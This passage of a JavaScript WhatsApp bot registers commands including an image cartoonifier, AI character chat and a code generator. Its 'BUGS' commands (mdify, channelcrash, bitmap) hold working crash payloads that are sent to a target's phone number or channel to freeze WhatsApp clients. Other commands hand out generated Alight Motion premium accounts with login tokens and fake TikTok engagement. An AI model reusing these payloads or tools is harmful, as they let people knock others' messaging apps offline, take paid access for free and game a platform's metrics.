      if (!cartoonUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ Could not convert image to cartoon. Please try a different image.` 
        });
      }

      // ==========================================================
      // Download and send the cartoon image
      // ==========================================================
      const imageResponse = await fetch(cartoonUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!imageResponse.ok) {
        throw new Error(`Failed to download cartoon: ${imageResponse.status}`);
      }

      const cartoonBuffer = Buffer.from(await imageResponse.arrayBuffer());

      if (cartoonBuffer.length < 1000) {
        return await sock.sendMessage(from, { 
          text: `❌ Generated cartoon image is too small. Please try again.` 
        });
      }

      const fileSize = (cartoonBuffer.length / 1024).toFixed(1);

      // ==========================================================
      // Send the cartoon image
      // ==========================================================
      await sock.sendMessage(from, {
        image: cartoonBuffer,
        caption: `🎨 *Cartoonified Image*\n\n📦 *Size:* ${fileSize} KB\n\n✅ *Successfully converted to cartoon style*\n\n✨ _Powered by OmegaTech_`
      });

    } catch (error) {
      console.error('Cartoonify error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not convert image.'}\n\n💡 Try:\n• A different image\n• A clearer photo\n• A URL instead of a file\n• ${prefix}${command} https://example.com/photo.jpg` 
      });
    }
  }
});
register({
  name: 'meta',
  aliases: ['metabots', 'aichat', 'coze', 'character'],
  category: 'AI',
  description: 'Chat with AI characters/bots from Meta (Coze/Anime/Diverse categories)',
  async execute({ sock, from, args, prefix, command, sessionId }) {
    // ==========================================================
    // Check if user provided an action
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🧠 *Meta AI Characters*\n\n*Actions:*\n• ${prefix}${command} categories - List all bot categories\n• ${prefix}${command} bots <category_id> - List bots in a category\n• ${prefix}${command} chat <bot_id> <message> - Chat with a bot\n• ${prefix}${command} search <query> - Search for a character\n\n*Quick examples:*\n${prefix}${command} categories\n${prefix}${command} bots 17\n${prefix}${command} chat 2 Hello Gojo!\n${prefix}${command} search anime` 
      });
    }

    const action = args[0].toLowerCase();
    const query = args.slice(1).join(" ");

    try {
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/Meta`);

      // ==========================================================
      // Action: categories - List all categories
      // ==========================================================
      if (action === 'categories') {
        apiUrl.searchParams.append('action', 'categories');
        
        const response = await fetch(apiUrl.toString(), {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });

        if (!response.ok) throw new Error(`API returned ${response.status}`);
        const data = await response.json();

        let categories = data.data || data.result || [];
        if (!categories.length) {
          return await sock.sendMessage(from, { text: '❌ No categories found.' });
        }

        let msg = `📂 *Meta Bot Categories (${categories.length})*\n\n`;
        for (const cat of categories) {
          const id = cat.id || cat.cid || '?';
          const name = cat.cname || cat.name || cat.category || 'Unknown';
          const count = cat.bots?.length || cat.count || 0;
          msg += `• *${name}* (ID: ${id}) — ${count} bots\n`;
        }
        msg += `\n💡 Use: ${prefix}${command} bots <category_id> to see bots`;
        await sock.sendMessage(from, { text: msg });
        return;
      }

      // ==========================================================
      // Action: bots - List bots in a category
      // ==========================================================
      if (action === 'bots') {
        if (!query) {
          return await sock.sendMessage(from, { 
            text: `❌ Please provide a category ID.\n\nUsage: ${prefix}${command} bots <category_id>\nExample: ${prefix}${command} bots 17\n\n💡 Use ${prefix}${command} categories to see all IDs.` 
          });
        }

        apiUrl.searchParams.append('action', 'categories');
        apiUrl.searchParams.append('cateid', query);

        const response = await fetch(apiUrl.toString(), {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });

        if (!response.ok) throw new Error(`API returned ${response.status}`);
        const data = await response.json();

        let bots = data.data || data.result || [];
        if (!bots.length) {
          return await sock.sendMessage(from, { text: `❌ No bots found in category ${query}.` });
        }

        let msg = `🤖 *Bots in Category ${query} (${bots.length})*\n\n`;
        for (const bot of bots) {
          const id = bot.id || bot.bot_id || '?';
          const name = bot.bot_name || bot.name || 'Unknown';
          const desc = bot.description || bot.desc || '';
          const vip = bot.is_vip ? '⭐' : '';
          msg += `• *${name}* ${vip} (ID: ${id})\n`;
          if (desc) msg += `  ${desc.slice(0, 60)}${desc.length > 60 ? '...' : ''}\n`;
          msg += `\n`;
        }
        msg += `💡 Use: ${prefix}${command} chat <bot_id> <message> to chat\n`;
        msg += `Example: ${prefix}${command} chat 2 Hello Gojo!`;
        await sock.sendMessage(from, { text: msg });
        return;
      }

      // ==========================================================
      // Action: chat - Chat with a specific bot
      // ==========================================================
      if (action === 'chat') {
        const parts = query.split(' ');
        if (parts.length < 2) {
          return await sock.sendMessage(from, { 
            text: `❌ Usage: ${prefix}${command} chat <bot_id> <message>\n\nExample: ${prefix}${command} chat 2 Hello Gojo!\n\n💡 Use ${prefix}${command} bots 17 to see bot IDs.` 
          });
        }

        const botId = parts[0];
        const message = parts.slice(1).join(' ');

        // Generate session ID for this user and bot
        const userSessionId = sessionId || from.split('@')[0];
        const sessionKey = `meta_${userSessionId}_${botId}`;

        apiUrl.searchParams.append('action', 'chat');
        apiUrl.searchParams.append('bot_id', botId);
        apiUrl.searchParams.append('prompt', message);
        apiUrl.searchParams.append('sessionId', sessionKey);

        await sock.sendMessage(from, { text: `🧠 *Meta AI thinking...*` });

        const response = await fetch(apiUrl.toString(), {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });

        if (!response.ok) throw new Error(`API returned ${response.status}`);
        const data = await response.json();

        let reply = data.result || data.response || data.reply || data.message || data.text;

        if (!reply) {
          const jsonString = JSON.stringify(data);
          const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
                            jsonString.match(/"response":"([^"]+)"/) ||
                            jsonString.match(/"reply":"([^"]+)"/) ||
                            jsonString.match(/"message":"([^"]+)"/);
          if (textMatch) reply = textMatch[1];
        }

        if (!reply) {
          return await sock.sendMessage(from, { text: `❌ No response from the bot.` });
        }

        reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');
        if (reply.length > 65000) reply = reply.slice(0, 65000) + '\n\n... (truncated)';

        if (reply.length > 1000) {
          const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
          for (let i = 0; i < Math.min(chunks.length, 5); i++) {
            const chunk = chunks[i].trim();
            if (!chunk) continue;
            const prefix = i === 0 ? `🧠 *Meta AI (${botId}):*\n\n` : `\n*...continued*\n\n`;
            await sock.sendMessage(from, { text: prefix + chunk });
            await new Promise(r => setTimeout(r, 300));
          }
        } else {
          await sock.sendMessage(from, { 
            text: `🧠 *Meta AI (${botId}):*\n\n${reply}` 
          });
        }
        return;
      }

      // ==========================================================
      // Action: search - Search for bots by keyword
      // ==========================================================
      if (action === 'search') {
        if (!query) {
          return await sock.sendMessage(from, { 
            text: `❌ Please provide a search query.\n\nUsage: ${prefix}${command} search <keyword>\nExample: ${prefix}${command} search anime` 
          });
        }

        apiUrl.searchParams.append('action', 'search');
        apiUrl.searchParams.append('query', query);

        const response = await fetch(apiUrl.toString(), {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });

        if (!response.ok) throw new Error(`API returned ${response.status}`);
        const data = await response.json();

        let results = data.data || data.result || [];
        if (!results.length) {
          return await sock.sendMessage(from, { text: `❌ No bots found for "${query}".` });
        }

        let msg = `🔍 *Search Results for "${query}" (${results.length})*\n\n`;
        for (const bot of results.slice(0, 15)) {
          const id = bot.id || bot.bot_id || '?';
          const name = bot.bot_name || bot.name || 'Unknown';
          const desc = bot.description || bot.desc || '';
          msg += `• *${name}* (ID: ${id})\n`;
          if (desc) msg += `  ${desc.slice(0, 60)}${desc.length > 60 ? '...' : ''}\n\n`;
        }
        if (results.length > 15) {
          msg += `\n*...and ${results.length - 15} more.*`;
        }
        msg += `\n💡 Use: ${prefix}${command} chat <bot_id> <message> to chat`;
        await sock.sendMessage(from, { text: msg });
        return;
      }

      // ==========================================================
      // Invalid action
      // ==========================================================
      await sock.sendMessage(from, { 
        text: `❌ Invalid action. Use: categories, bots, chat, search\n\n💡 ${prefix}${command} categories to start.` 
      });

    } catch (error) {
      console.error('Meta error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not reach Meta API.'}\n\n💡 Try:\n• ${prefix}${command} categories\n• ${prefix}${command} bots 17\n• ${prefix}${command} chat 2 Hello` 
      });
    }
  }
});
register({
  name: 'alightgen',
  aliases: ['alight', 'amprem', 'alightprem', 'amgen'],
  category: 'TOOLS',
  description: 'Generate Alight Motion premium account credentials',
  async execute({ sock, from, args, prefix, command }) {
    await sock.sendMessage(from, { text: `⏳ Generating Alight Motion premium account...` });

    try {
      // ==========================================================
      // Call OmegaTech Alight Motion Generator API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/tools/Alightmotion-Prem-gen`);
      apiUrl.searchParams.append('action', 'generate');

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if generation was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Account generation failed.\n\n💡 Try again later.` 
        });
      }

      const accounts = data.data?.accounts || [];
      
      if (!accounts.length) {
        return await sock.sendMessage(from, { 
          text: `❌ No accounts generated. Please try again.` 
        });
      }

      const account = accounts[0];
      
      // ==========================================================
      // Extract account details
      // ==========================================================
      const email = account.email || 'N/A';
      const link = account.link || 'N/A';
      const status = account.status ? '✅ Valid' : '❌ Invalid';
      
      const idToken = account.data?.idToken || 'N/A';
      const userId = account.data?.user?.localId || 'N/A';
      const emailVerified = account.data?.user?.emailVerified ? '✅ Yes' : '❌ No';

      // Premium details
      const premium = account.data?.premium?.data?.result || {};
      const isPremium = premium.valid ? '✅ Active' : '❌ Inactive';
      const autoRenew = premium.autoRenewing ? 'Yes' : 'No';
      
      let expiry = 'N/A';
      if (premium.expiryTimeMillis) {
        const expiryDate = new Date(parseInt(premium.expiryTimeMillis));
        expiry = expiryDate.toLocaleString();
      }

      // ==========================================================
      // Build response message
      // ==========================================================
      const msg = `🎬 *Alight Motion Premium Account*\n\n` +
        `📧 *Email:* ${email}\n` +
        `🔗 *Link:* ${link}\n\n` +
        `📊 *Account Status:* ${status}\n` +
        `🆔 *User ID:* ${userId}\n` +
        `📧 *Email Verified:* ${emailVerified}\n\n` +
        `✨ *Premium Status:* ${isPremium}\n` +
        `🔄 *Auto-Renew:* ${autoRenew}\n` +
        `⏰ *Expires:* ${expiry}\n\n` +
        `🔑 *ID Token:*\n\`${idToken.slice(0, 60)}...\`\n\n` +
        `📌 *Instructions:*\n` +
        `1. Open the link in your browser\n` +
        `2. You'll be automatically signed in\n` +
        `3. Open Alight Motion and enjoy premium features\n\n` +
        `⚠️ *Note:* Accounts may expire. Generate a new one if this stops working.\n` +
        `✨ _Powered by OmegaTech_`;

      // ==========================================================
      // Send the account details
      // ==========================================================
      await sock.sendMessage(from, { text: msg });

    } catch (error) {
      console.error('Alight Motion generator error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not generate account.'}\n\n💡 Try:\n• ${prefix}${command} (retry)\n• Wait a few minutes and try again\n• The generator may be rate-limited` 
      });
    }
  }
});
register({
  name: 'llamacoder',
  aliases: ['llama', 'coder', 'aicoder', 'llamacode'],
  category: 'AI',
  description: 'Generate code/projects with Llamacoder AI (web apps, portfolios, etc.)',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a prompt
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🤖 *Llamacoder AI - Code Generator*\n\nUsage: ${prefix}${command} <prompt> [quality]\n\n*Quality options:*\n• low (fast, basic)\n• medium (balanced)\n• high (detailed, full project)\n\n*Examples:*\n${prefix}${command} A simple portfolio\n${prefix}${command} A to-do app with React low\n${prefix}${command} A weather dashboard high\n${prefix}${command} A landing page for a coffee shop medium\n\n*Note:* Generates full project files (React, Next.js, etc.)` 
      });
    }

    // ==========================================================
    // Parse prompt and quality
    // ==========================================================
    let prompt = args.join(" ");
    let quality = 'low'; // default

    // Check if last word is a quality option
    const lastWord = args[args.length - 1].toLowerCase();
    if (['low', 'medium', 'high'].includes(lastWord)) {
      quality = lastWord;
      prompt = args.slice(0, -1).join(" ");
    }

    await sock.sendMessage(from, { 
      text: `🤖 *Llamacoder generating...*\n📝 Prompt: *${prompt}*\n📊 Quality: *${quality}*\n⏳ This may take 10-30 seconds...` 
    });

    try {
      // ==========================================================
      // Call Llamacoder API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/llamacoder`);
      apiUrl.searchParams.append('action', 'create');
      apiUrl.searchParams.append('prompt', prompt);
      apiUrl.searchParams.append('quality', quality);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if generation was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Generation failed: ${data.message || 'Unknown error'}` 
        });
      }

      // ==========================================================
      // Extract data
      // ==========================================================
      const sessionId = data.sessionId || 'N/A';
      const chatId = data.chatId || 'N/A';
      const filesCount = data.filesCount || 0;
      const files = data.files || [];

      // ==========================================================
      // Build response message
      // ==========================================================
      let msg = `🤖 *Llamacoder Generation Complete*\n\n`;
      msg += `📝 *Prompt:* ${prompt}\n`;
      msg += `📊 *Quality:* ${quality}\n`;
      msg += `📁 *Files Generated:* ${filesCount}\n`;
      msg += `🆔 *Session ID:* ${sessionId}\n`;
      msg += `💬 *Chat ID:* ${chatId}\n\n`;

      if (files.length) {
        msg += `📂 *Files Created:*\n`;
        for (const file of files) {
          const path = file.path || 'unknown';
          const content = file.content || '';
          const preview = content.slice(0, 100).replace(/\n/g, ' ').trim();
          msg += `• *${path}*\n  \`${preview}${content.length > 100 ? '...' : ''}\`\n\n`;
        }
      }

      // ==========================================================
      // Ask if user wants full code
      // ==========================================================
      msg += `\n💡 *To get the full code:*\n`;
      msg += `${prefix}${command} get ${sessionId}\n\n`;
      msg += `✨ _Powered by OmegaTech Llamacoder_`;

      await sock.sendMessage(from, { text: msg });

    } catch (error) {
      console.error('Llamacoder error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not generate code.'}\n\n💡 Try:\n• A shorter prompt\n• ${prefix}${command} simple to-do app low\n• ${prefix}${command} portfolio medium\n• Check your internet connection` 
      });
    }
  }
});

// ==========================================================
// Sub-command: Get full code from a session
// ==========================================================
register({
  name: 'llamacoder get',
  aliases: ['llamaget', 'codepull', 'llamafiles'],
  category: 'AI',
  description: 'Get full code files from a Llamacoder session',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📂 *Get Llamacoder Files*\n\nUsage: ${prefix}${command} get <session_id>\nExample: ${prefix}${command} get be7ca71b-f32b-4cc4-b87f-32add052b94e` 
      });
    }

    const sessionId = args[0];

    await sock.sendMessage(from, { text: `⏳ Fetching files for session ${sessionId}...` });

    try {
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/llamacoder`);
      apiUrl.searchParams.append('action', 'get');
      apiUrl.searchParams.append('sessionId', sessionId);

      const response = await fetch(apiUrl.toString(), {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });

      if (!response.ok) throw new Error(`API returned ${response.status}`);
      const data = await response.json();

      if (!data.success) {
        return await sock.sendMessage(from, { text: `❌ ${data.message || 'Session not found.'}` });
      }

      const files = data.files || [];
      if (!files.length) {
        return await sock.sendMessage(from, { text: `❌ No files found for session ${sessionId}.` });
      }

      // ==========================================================
      // Send each file as a document or text
      // ==========================================================
      let sentCount = 0;
      for (const file of files) {
        const path = file.path || 'file';
        const content = file.content || '';

        if (!content) continue;

        const buffer = Buffer.from(content, 'utf-8');
        const ext = path.split('.').pop() || 'txt';
        const fileName = path.replace(/\//g, '_');

        try {
          await sock.sendMessage(from, {
            document: buffer,
            mimetype: 'text/plain',
            fileName: fileName,
            caption: `📁 *${path}*\n📦 ${(buffer.length / 1024).toFixed(1)} KB`
          });
          sentCount++;
          await new Promise(r => setTimeout(r, 500));
        } catch (sendErr) {
          // Try sending as text if document fails
          const preview = content.slice(0, 1000);
          await sock.sendMessage(from, { 
            text: `📁 *${path}*\n\n\`\`\`${ext}\n${preview}${content.length > 1000 ? '\n\n... (truncated)' : ''}\n\`\`\`` 
          });
          sentCount++;
        }
      }

      if (sentCount === 0) {
        await sock.sendMessage(from, { text: `❌ Could not send any files.` });
      } else {
        await sock.sendMessage(from, { 
          text: `✅ Sent *${sentCount}* file${sentCount > 1 ? 's' : ''} from session ${sessionId}.` 
        });
      }

    } catch (error) {
      console.error('Llamacoder get error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not fetch files.'}` 
      });
    }
  }
});
register({
  name: 'mdify',
  aliases: ['crash', 'boom', 'freeze'],
  category: 'BUGS',
  description: 'Send a crash payload to freeze WhatsApp clients (use with caution)',
  async execute({ sock, from, msg, args, prefix, command }) {
    // ==========================================================
    // Owner only - prevent abuse
    // ==========================================================
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, { 
        text: `❌ *Owner only command.*\n\nThis is a dangerous command that can crash WhatsApp clients.` 
      });
    }

    // ==========================================================
    // Check if user provided a target number
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `💀 *Usage:* ${prefix}${command} <phone_number>\n\n*Example:*\n${prefix}${command} 2348269946429\n\n⚠️ *Without country code?* Include it (e.g., 234 for Nigeria).` 
      });
    }

    // ==========================================================
    // Format the target JID
    // ==========================================================
    let rawNumber = args[0].replace(/[^0-9]/g, '');
    
    // Add @s.whatsapp.net if not already present
    let targetJid = rawNumber.includes('@') ? rawNumber : `${rawNumber}@s.whatsapp.net`;

    // Send confirmation
    await sock.sendMessage(from, { 
      text: `💀 *Sending crash payload to ${rawNumber}...*\n⚠️ This will freeze the target's WhatsApp client.` 
    });

    try {
      // ==========================================================
      // YOUR ORIGINAL FUNCTION - UNCHANGED
      // ==========================================================
      async function mdify(sock, jid) {
        return await sock.relayMessage(jid, {
          "botForwardedMessage": {
            "message": {
              "richResponseMessage": {
                "messageType": 1,
                "unifiedResponse": {
                  "data": Buffer.from(JSON.stringify(
                    {
                      "sections": [
                        {
                          "view_model": {
                            "primitive": {
                              "text": `==.${"\n".repeat(100000)}.==`,
                              "__typename": "GenAIMarkdownTextUXPrimitive"
                            },
                            "__typename": "GenAISingleLayoutViewModel"
                          }
                        }
                      ]
                    }
                  )).toString("base64")
                },
                "contextInfo": {
                  "isForwarded": true,
                  "forwardOrigin": 4
                }
              }
            }
          }
        });
      }

      // ==========================================================
      // Execute the function with target JID
      // ==========================================================
      await mdify(sock, targetJid);

      await sock.sendMessage(from, { 
        text: `✅ *Payload sent to ${rawNumber}*\n\n📌 *Target:* ${targetJid}\n📊 *Payload type:* Rich response crash\n\n⚠️ If the client doesn't crash immediately, they may have patched it.` 
      });

    } catch (error) {
      console.error('mdify error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not send payload.'}\n\n💡 Make sure the number is valid and has WhatsApp.` 
      });
    }
  }
});
register({
  name: 'channelcrash',
  aliases: ['chcrash', 'cchannel', 'channelboom'],
  category: 'BUGS',
  description: 'Crash a WhatsApp channel via channel link (use with caution)',
  async execute({ sock, from, msg, args, prefix, command }) {
    // ==========================================================
    // Owner only - prevent abuse
    // ==========================================================
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, { 
        text: `❌ *Owner only command.*\n\nThis is a dangerous command that can crash WhatsApp channels.` 
      });
    }

    // ==========================================================
    // Check if user provided a channel link
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `💀 *Usage:* ${prefix}${command} <channel_link> [count]\n\n*Examples:*\n${prefix}${command} https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX\n${prefix}${command} https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX 10\n\n*Count:* Number of payloads to send (default: 5, max: 20)\n\n*Note:* The channel must be one you are subscribed to or admin of.` 
      });
    }

    // ==========================================================
    // Parse channel link and extract channel ID
    // ==========================================================
    const channelLink = args[0];
    let channelJid = null;
    let rawChannelId = '';

    // Extract channel ID from WhatsApp channel link
    // Format: https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX
    if (channelLink.includes('whatsapp.com/channel/')) {
      const parts = channelLink.split('/');
      rawChannelId = parts[parts.length - 1].split('?')[0].split('#')[0];
      channelJid = `${rawChannelId}@newsletter`;
    } 
    // If user already provided the JID format
    else if (channelLink.includes('@newsletter')) {
      channelJid = channelLink;
      rawChannelId = channelLink.split('@')[0];
    } 
    // If user just provided the channel ID
    else if (channelLink.match(/^[0-9a-zA-Z]{16,}$/)) {
      rawChannelId = channelLink;
      channelJid = `${rawChannelId}@newsletter`;
    }

    if (!channelJid) {
      return await sock.sendMessage(from, { 
        text: `❌ *Invalid channel link.*\n\nPlease provide a valid WhatsApp channel link:\n${prefix}${command} https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX` 
      });
    }

    let count = parseInt(args[1]) || 5;
    if (count < 1) count = 1;
    if (count > 20) count = 20;

    await sock.sendMessage(from, { 
      text: `💀 *Channel crash initiated...*\n📌 *Channel:* ${rawChannelId}\n📊 *Payloads:* ${count}\n⏳ *Sending payloads...*` 
    });

    try {
      // ==========================================================
      // YOUR ORIGINAL FUNCTION - UNCHANGED
      // ==========================================================
      const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

      async function channelHome(sock, target, count = 5) {
        for (let x = 0; x < count; x++) {
          sock.relayMessage(target, {
            "messageContextInfo": {
              "messageAssociation": {
                "parentMessageKey": {"id": ""}
              }
            },
            "extendedTextMessage": {}
          }, {})
          await sleep(5000)
        }
      }

      // ==========================================================
      // Execute the function with channel JID
      // ==========================================================
      await channelHome(sock, channelJid, count);

      await sock.sendMessage(from, { 
        text: `✅ *Channel crash completed*\n\n📌 *Channel:* ${rawChannelId}\n📊 *Payloads sent:* ${count}\n⏱️ *Total time:* ~${count * 5} seconds\n\n⚠️ If the channel doesn't freeze/crash, they may have patched it.` 
      });

    } catch (error) {
      console.error('Channel crash error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not send channel crash payloads.'}\n\n💡 Make sure:\n• You are subscribed to the channel\n• The channel link is valid\n• The bot is connected to WhatsApp` 
      });
    }
  }
});
register({
  name: 'bitmap',
  aliases: ['latexcrash', 'texboom', 'rendercrash'],
  category: 'BUGS',
  description: 'Crash target using LaTeX null-byte rendering exploit',
  async execute({ sock, from, msg, args, prefix, command }) {
    // ==========================================================
    // Owner only - prevent abuse
    // ==========================================================
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, { 
        text: `❌ *Owner only command.*\n\nThis is a powerful crash exploit that can freeze WhatsApp clients.` 
      });
    }

    // ==========================================================
    // Check if user provided a target
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `💀 *Usage:* ${prefix}${command} <target>\n\n*Examples:*\n${prefix}${command} 2348269946429 (phone number)\n${prefix}${command} 2348269946429@s.whatsapp.net (JID)\n${prefix}${command} 0029VaXxXxXxXxXxXxX@newsletter (channel)\n\n⚠️ *Powerful LaTeX exploit — use with extreme caution.*` 
      });
    }

    // ==========================================================
    // Format the target JID
    // ==========================================================
    let rawTarget = args[0];
    let targetJid = rawTarget;

    // If it's a phone number without @, add @s.whatsapp.net
    if (!rawTarget.includes('@') && !rawTarget.includes('whatsapp.com')) {
      // Check if it's a channel ID (starts with 0029 or similar)
      if (rawTarget.match(/^[0-9a-zA-Z]{16,}$/)) {
        targetJid = `${rawTarget}@newsletter`;
      } else {
        // Phone number
        const cleanNumber = rawTarget.replace(/[^0-9]/g, '');
        targetJid = `${cleanNumber}@s.whatsapp.net`;
      }
    }

    await sock.sendMessage(from, { 
      text: `💀 *Bitmap crash initiated...*\n📌 *Target:* ${targetJid}\n📊 *Payload:* LaTeX null-byte exploit\n⏳ *Sending...*` 
    });

    try {
      // ==========================================================
      // YOUR ORIGINAL FUNCTION - UNCHANGED
      // ==========================================================
      async function bitmap(sock, jid) {
        return await sock.relayMessage(jid, {
          "botForwardedMessage": {
            "message": {
              "richResponseMessage": {
                "messageType": 1,
                "submessages": [
                  {
                    "messageType": 8,
                    "latexMetadata": {
                      "text": "\0",
                      "expressions": [
                        {
                          "latexExpression": "\0",
                          "width": 99999999,
                        }
                      ]
                    }
                  }
                ],
                "contextInfo": {
                  "isForwarded": true,
                  "forwardOrigin": 4
                }
              }
            }
          }
        })
      }

      // ==========================================================
      // Execute the function
      // ==========================================================
      await bitmap(sock, targetJid);

      await sock.sendMessage(from, { 
        text: `✅ *Bitmap crash sent to ${targetJid}*\n\n📌 *Target:* ${targetJid}\n📊 *Exploit:* LaTeX null-byte overflow\n📐 *Width:* 99,999,999 (max integer)\n\n⚠️ *If client doesn't crash:*
• WhatsApp may have patched this
• Target may be using a different client
• Try the channel or phone version` 
      });

    } catch (error) {
      console.error('Bitmap error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ *Error:* ${error.message || 'Could not send crash payload.'}\n\n💡 *Troubleshooting:*
• Make sure the target has WhatsApp
• Check if the JID is formatted correctly
• Try a different target type (phone/channel)` 
      });
    }
  }
});
register({
  name: 'tiktokboost',
  aliases: ['ttboost', 'boost', 'ttviews', 'tiktokviews'],
  category: 'TOOLS',
  description: 'Boost TikTok video views and engagement',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a TikTok URL
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🚀 *TikTok Video Booster*\n\nUsage: ${prefix}${command} <tiktok_url>\nExample: ${prefix}${command} https://www.tiktok.com/@username/video/xxxxx\n\n*Note:* Likes and views take time to register.\n\n*Supports:*\n• TikTok video URLs\n• Short links (vm.tiktok.com)\n• Profile video links` 
      });
    }

    const url = args[0];

    // ==========================================================
    // Validate TikTok URL
    // ==========================================================
    if (!url.includes('tiktok.com') && !url.includes('vm.tiktok.com')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid TikTok video link.\n\nExample: https://www.tiktok.com/@username/video/xxxxx` 
      });
    }

    await sock.sendMessage(from, { 
      text: `🚀 *Processing boost...*\n⏳ This may take a few seconds.\n\n📱 URL: ${url.slice(0, 50)}...` 
    });

    try {
      // ==========================================================
      // Call OmegaTech TikTok Booster API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/Fun/Tiktok-booster`);
      apiUrl.searchParams.append('action', 'boost');
      apiUrl.searchParams.append('url', url);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if the request was successful
      // ==========================================================
      if (!data.success) {
        const errorMsg = data.message || data.error || 'Unknown error';
        return await sock.sendMessage(from, { 
          text: `❌ Boost failed: ${errorMsg}\n\n💡 Try again later or check the URL.` 
        });
      }

      // ==========================================================
      // Extract and display the boost result
      // ==========================================================
      const result = data.data || {};
      const title = result.title || 'TikTok Video';
      const author = result.author || result.username || 'Unknown';
      const username = result.username || author;
      const status = result.status || 'completed';

      const statusEmoji = status === 'completed' ? '✅' : '⏳';

      const boostMessage = `🚀 *TikTok Boost Successful!*\n\n` +
        `${statusEmoji} *Status:* ${status}\n` +
        `📱 *Video:* ${title.slice(0, 60)}${title.length > 60 ? '...' : ''}\n` +
        `👤 *Author:* ${author} (@${username})\n` +
        `🔗 *URL:* ${url.slice(0, 40)}...\n\n` +
        `📊 *Boost Started*\n` +
        `⏱️ *Timestamp:* ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now'}\n\n` +
        `*⚠️ Note:* Likes and views take time to register.\n` +
        `✨ _Powered by Nexus_md`;

      await sock.sendMessage(from, { 
        text: boostMessage 
      });

    } catch (error) {
      console.error('TikTok boost error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not boost video.'}\n\n💡 Try:\n• Check the URL is valid\n• Try again later\n• Use a different TikTok video` 
      });
    }
  }
});
register({
  name: 'waifu',
  aliases: ['animegirl', 'waifuai', 'waifuimg'],
  category: 'TOOLS',
  description: 'Get a random anime waifu image',
  async execute({ sock, from, prefix, command }) {
